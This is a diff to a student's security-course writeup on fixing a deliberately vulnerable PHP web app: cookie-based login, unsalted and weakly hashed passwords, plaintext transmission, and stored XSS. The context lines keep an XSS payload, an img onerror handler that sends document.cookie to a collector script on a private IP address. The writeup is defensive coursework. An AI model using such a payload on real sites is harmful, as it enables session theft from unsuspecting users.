@@ -1,8 +1,6 @@
 # Project Writeup
 
-Bradley Rosenfeld
-COS342
-11/14/15
+Bradley Rosenfeld - COS342, 11/14/15
 
 ## Part 1.
 
@@ -12,7 +10,7 @@ COS342
 
  In order to fix this I implemented PHP sessions. Rather than sending the actual username and password as a cookie, a unique session ID is set which an attacker wouldn't be able to guess (they could snoop for it, but that is addressed later). The application then checks for the existence of the session ID and makes sure it is valid. Similarly, the deletion action will check to make sure the user is actually authorized and that the ID provided is valid.
 
-2. The database only contains password hashes. But the passwords are not salted resulting in duplication of hashes.
+2. The database only contains password hashes. The passwords are not hashed with a strong algorithm and they are not salted resulting in duplication of hashes.
 
 3. Attackers can easily snoop for user credentials for multiple reasons. Since the site is not HTTPS, usernames and passwords are sent via plantext over the network. Furthermore, the username and hashed password are stored in cookies which are sent with every network request. It would be trivial to snoop for credentials.
 
@@ -32,7 +30,7 @@ The attacker could post an image that fails to load, forcing JS to run. In this 
 <img src="fdfjkdfjfkjdfdf.dfdjf" onerror="this.src=\'http://10.121.20.103/hackme-xss.php?c=\' + document.cookie">
 ```
 
-If you're on the Taylor University network, you can view the result of this attack by visiting [http://10.121.20.103/hackme-xss.php](10.121.20.103/hackme-xss.php)
+If you're on the Taylor University network, you can view the result of this attack by visiting [10.121.20.103/hackme-xss.php](http://10.121.20.103/hackme-xss.php)
 
 In order to fix this, I disabled all usage of HTML in messages by using the `htmlspecialchars` function in PHP when rendering the user submitted content.
 
